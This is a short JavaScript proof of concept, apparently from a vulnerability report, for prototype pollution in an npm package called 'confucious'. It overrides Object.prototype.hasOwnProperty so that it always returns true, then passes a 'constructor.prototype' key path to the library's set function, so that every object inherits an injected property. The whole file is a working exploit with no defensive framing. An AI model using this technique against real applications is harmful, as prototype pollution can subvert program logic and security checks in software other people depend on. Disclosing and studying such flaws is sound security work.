Object.prototype.hasOwnProperty = () => true;
console.log({}.polluted);
const confucious = require('confucious');
confucious.set('constructor.prototype:polluted', 'yes');
console.log({}.polluted);